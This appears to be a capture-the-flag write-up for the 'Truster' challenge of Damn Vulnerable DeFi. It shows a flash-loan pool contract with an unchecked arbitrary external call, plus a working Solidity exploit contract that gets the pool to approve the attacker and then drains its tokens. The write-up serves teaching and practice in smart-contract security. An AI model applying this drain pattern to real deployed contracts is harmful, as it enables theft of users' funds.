# Truster #
Here is the contract that we will be reviewing.

`pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TrusterLenderPool is ReentrancyGuard {

    IERC20 public damnValuableToken;

    constructor (address tokenAddress) public {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        (bool success, ) = target.call(data);
        require(success, "External call failed");

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}`


In this challenge the vulnerability is with the low level call in the flashloan function.        
`        (bool success, ) = target.call(data);
        require(success, "External call failed");`
With data passed in as parameter, we can put in a malicious code into it and make a cal to it.

here we create a contract to exploit the `TrusterLenderPool` contract

`contract TrusterExploit {
    function attack ( address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), uint(-1)
        );

        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
    }
}`

so here is a solution to the code
here we encode the ERC20 approve function passing in the TrusterExploit address and the maximum number of uint(uint(-1)) will cause overflow and will return the maximum number of uint (115792089237316195423570985008687907853269984665640564039457584007913129639935)

The `flashLoan` function in the `TrusterLenderPool` is called with the encoded data passed in.

we borrowed 0 token from the flashloan so we don't have any amounbt to pay back. but what we do here is we made the `TrusterLenderPool` contract to approve our contract to spend all the `damnValuableToken` in the contract. 

`token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));` here we transfer the approve token out to our address (msg.sender).

here is a link to the solution to the challenge [solution](https://github.com/Ultra-Tech-code/damn-vulnerable-defi/blob/7edb89e5cb7464179bfc99fa4824f8efa48d6d0b/test/truster/truster.challenge.js#L33)

